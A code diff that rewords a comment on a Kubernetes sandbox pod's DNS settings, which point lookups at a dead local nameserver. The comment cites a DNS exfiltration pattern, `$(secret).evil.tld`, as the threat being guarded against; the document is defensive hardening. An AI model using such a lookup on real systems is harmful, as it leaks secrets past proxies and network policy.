@@ -55,10 +55,11 @@ _QUANTITY_SUFFIXES: dict[str, int] = {
 
 
 # The sandbox resolves no names itself: it reaches the server by IP, proxy-aware tools
-# leave resolution to the proxy, and tunnels shadow their hosts in /etc/hosts. Cluster
-# DNS would forward any name, so a lookup like `$(secret).evil.tld` leaks data past the
-# proxy. Kubernetes requires a nameserver; nothing listens on 127.0.0.1:53 in the
-# sandbox, so lookups fail fast. Set on the pod so it holds without the NetworkPolicy.
+# leave resolution to the proxy, and tunnels shadow their hosts in /etc/hosts. The
+# NetworkPolicy blocks kube-dns, since cluster DNS would forward `$(secret).evil.tld`
+# past the proxy. This only rewrites resolv.conf, so lookups fail fast instead of timing
+# out against the blocked kube-dns; it stops no deliberate query to another resolver.
+# Kubernetes requires a nameserver, and nothing listens on 127.0.0.1:53 in the sandbox.
 _NO_DNS_POD_SPEC = {"dnsPolicy": "None", "dnsConfig": {"nameservers": ["127.0.0.1"]}}
 
 
